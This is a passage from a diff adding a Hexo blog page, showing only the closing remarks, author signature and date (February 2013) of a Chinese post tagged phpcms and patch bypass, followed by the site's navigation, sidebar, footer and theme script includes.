style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x07&nbsp;<span style="font-family:宋体;">结束语</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">以上皆是小菜一家之言，</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">如有错误希望指正，</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">如有建议希望讨论，</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">最后祝大家新年快乐。</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">作者：<span style="font-family:’Times New Roman’;">L.N.&nbsp;&nbsp;&amp;&amp;&nbsp;&nbsp;N3w1yB1r7h</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">邮箱：</span><a href="mailto:1083243604@qq.com" target="_blank" rel="noopener"><span class="15" style="color:#0000ff;font-weight:bold;font-size:10pt;font-family:宋体;">1083243604@qq.com</span></a><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">博客：<span style="font-family:’Times New Roman’;">lanu.sinaapp.com</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">时间：<span style="font-family:’Times New Roman’;">2013</span><span style="font-family:宋体;">年</span><span style="font-family:’Times New Roman’;">2</span><span style="font-family:宋体;">月</span><span style="font-family:’Times New Roman’;">19</span><span style="font-family:宋体;">日</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="font-size:10.5pt;font-family:宋体;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br></div>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/phpcms/" rel="tag"># phpcms</a>
+          
+            <a href="/tags/绕过补丁/" rel="tag"># 绕过补丁</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2013/02/17/看mfc的笔记/" rel="next" title="看mfc的笔记">
+                <i class="fa fa-chevron-left"></i> 看mfc的笔记
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2013/03/17/kali-linux-安装遇到的一些问题/" rel="prev" title="kali linux 安装遇到的一些问题">
+                kali linux 安装遇到的一些问题 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">John Doe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">165</span>
+                  <span class="site-state-item-name">Artikel</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">Kategorien</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">183</span>
+                  <span class="site-state-item-name">Tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
